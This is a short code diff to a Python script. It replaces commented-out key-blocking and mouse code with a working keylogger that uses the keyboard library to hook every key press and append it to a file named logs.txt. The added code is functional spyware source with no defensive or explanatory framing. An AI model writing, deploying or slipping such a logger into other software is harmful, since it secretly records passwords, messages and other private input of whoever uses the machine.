@@ -1,6 +1,28 @@
-import pyautogui
-import keyboard
-import time
+import keyboard #The keyboard module
+
+def writer(data):
+    with open("logs.txt","a") as file:
+        file.write(data)
+
+def filter(char):
+	if char == "space":
+		return " "
+	elif len(char) > 1:
+		return "[%s]" % char
+	else:
+		return char
+
+def logger(event):
+	writer(filter(event.name))
+
+keyboard.on_press(logger)
+keyboard.wait()
+
+
+
+# import pyautogui
+# import keyboard
+# import time
 
 # stopKey = "s" #The stopKey is the button to press to stop. you can also do a shortcut like ctrl+s
 # maxX, maxY = pyautogui.size() #get max size of screen
@@ -17,16 +39,16 @@ import time
 
 
 
-print("blocking")
-for i in range(150):
-	keyboard.block_key(i)
+# print("blocking")
+# for i in range(150):
+# 	keyboard.block_key(i)
 
 
-time.sleep(3)
+# time.sleep(3)
 
-print("unblocking")
-for i in range(150):
-	keyboard.unblock_key(i)
+# print("unblocking")
+# for i in range(150):
+# 	keyboard.unblock_key(i)
 
 
 
